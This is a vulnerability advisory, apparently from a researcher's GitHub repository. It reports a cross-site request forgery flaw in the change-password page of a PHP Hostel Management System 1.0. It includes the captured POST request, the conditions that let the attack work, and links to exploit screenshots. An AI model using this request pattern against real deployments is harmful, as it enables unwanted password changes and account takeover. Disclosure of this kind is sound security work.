## Vulnerability Details

**Credits**:
  > Paul Rivera: (https://github.com/blackslim3)<br/>

**Tested On**:
  > Hostel Management System using PHP and MySQL 1.0 : https://github.com/Surya2Developer/Hostel_Management_System/

**Affected Version**:
  > Hostel Management System using PHP and MySQL 1.0

**Affected Site Page**:
  > /change-password.php

**Affected Code**:
  > change-password.php

**Related CWE**:
  > CWE-352: Cross-Site Request Forgery (CSRF): https://cwe.mitre.org/data/definitions/352.html

## **Details**:
  > On the change-password functionality, an attacker can induce a user to do unintended password change by visiting an attacker controlled website. 

```http
POST /hostel/change-password.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://localhost
Connection: close
Referer: http://localhost/hostel/change-password.php
Cookie: PHPSESSID=pl4c7vknv65g74iqov35nu8e01
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1


oldpassword=6786786786&newpassword=password123&cpassword=password123&changepwd=Change+Password

```

  > On the POST request above, it has the following conditions that allows a CSRF to work:
    1. Relevant Action: change password
    2. Cookie-based session handling
    3. No unpredictable token needed
    4. The `oldpassword` value can be the attacker's password. 

  > CSRF Exploit:
![image](https://github.com/blackslim3/cve_sidequest/blob/main/poc/assets/CSRF_exploit.png)

  > CSRF Exploit Successfuly
![image](https://github.com/blackslim3/cve_sidequest/blob/main/poc/assets/CSRF_changePassword_success.png)

## **Vulnerability Impact**:
    > In a successful CSRF attack, an attacker can causes a user to perform change password unintentionally.
    